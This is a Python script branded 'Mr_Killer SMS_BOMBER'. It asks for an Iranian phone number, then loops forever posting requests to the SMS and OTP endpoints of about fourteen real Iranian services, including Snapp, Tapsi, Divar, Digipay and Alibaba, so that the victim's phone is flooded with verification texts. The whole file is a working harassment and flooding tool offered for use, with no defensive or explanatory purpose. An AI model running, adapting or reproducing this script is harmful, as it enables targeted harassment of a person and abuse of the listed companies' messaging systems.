import os
import threading
import requests
import time
def print_slow(txt):
    for x in txt:
        print(x, end='', flush=True)  
        time.sleep(0.1)
red='\033[31m'
green='\033[32m'
print(f"""{red}
                            @@@
                             @@@     
                              @@@    Mr_Killer SMS_BOMBER
                              @@@    t.me/Bad_Tm_1
                      @@@@@@@@@@@@@@@@@@@@@@
                    @@@@@@@@@@@@@@@@@@@@@@@@@@
                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                @@@@@@@@ @@@@@@@@@@@@@@@@ @@@@@@@@
              @@@@@@@@@   @@@@@@@@@@@@@@   @@@@@@@@@
            @@@@@@@@@@     @@@@@@@@@@@@     @@@@@@@@@@
           @@@@@@@@@@       @@@@  @@@@       @@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@
           @@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
           @@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@
            @@@@@@@@  @@ @@ @@ @@ @@ @@ @@ @  @@@@@@@@
              @@@@@@@                        @@@@@@@
                @@@@@@  @@ @@ @@ @@ @@ @@ @ @@@@@@
                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                    @@@@@@@@@@@@@@@@@@@@@@@@@@
                      @@@@@@@@@@@@@@@@@@@@@@
""")

phone = input(f"{green}[?]Enter phone(+98******) : ") 
f = "0" + phone.split("98")[1]
os.system("clear")
print_slow("loading[■■■10%]\n")
os.system("clear")
print_slow("loading[■■■■■40%]\n")
os.system("clear")
print_slow("loading[■■■■■■■80%]\n")
os.system("clear")
print_slow("loading[■■■■■■■■■■100%]\n")
os.system("clear")
print("Attacking.....")
snapj = {"cellphone":phone}
digij = {"cellNumber":f,"device":{"deviceId":"a16e6255-17c3-431b-b047-3f66d24c286f","deviceModel":"WEB_BROWSER","deviceAPI":"WEB_BROWSER","osName":"WEB"}}
snap2j = {"phone":f}
tapsi1 = {"credential":{"phoneNumber":f,"role":"PASSENGER"}}
divarj = {"phone":f}
emd = "send=1&cellphone="+f
rubj = {"api_version":"3","method":"sendCode","data":{"phone_number":phone,"send_type":"SMS"}}
bamad = "cellNumber="+f 
ali = {"phoneNumber": f }
hamrah = {"action":"getAppViaSMS","number": f } 
arkd = {"mobile":f,"country_code":"IR","provider_code":"RUBIKA"} 
while True:
	requests.post("https://app.mydigipay.com/digipay/api/users/send-sms",json=digij)
	requests.post("https://api.snapp.ir/api/v1/sms/link",json=snap2j)
	requests.post("https://api.tapsi.cab/api/v2/user",json=tapsi1)
	requests.post("https://api.divar.ir/v5/auth/authenticate",json=divarj)
	requests.post("https://messengerg2c42.iranlms.ir/",json=rubj)
	requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",json=snapj)
	requests.get("https://api.binjo.ir/api/panel/get_code/"+f)
	requests.get("https://core.gap.im/v1/user/add.json?mobile="+f)
	requests.post("https://web.emtiyaz.app/json/login",data=emd)
	requests.get("https://api.torob.com/a/phone/send-pin/?phone_number="+f)
	requests.post("https://bama.ir/signin-checkforcellnumber",data=bamad)
	requests.post("https://ws.alibaba.ir/api/v3/account/mobile/otp",json=ali)
	requests.post("https://hamrahcard.ir/wp-admin/admin-ajax.php",data=hamrah)
	requests.post("https://api.chartex.net/api/v2/user/validate",json=arkd)
	
	
	
	
	
	

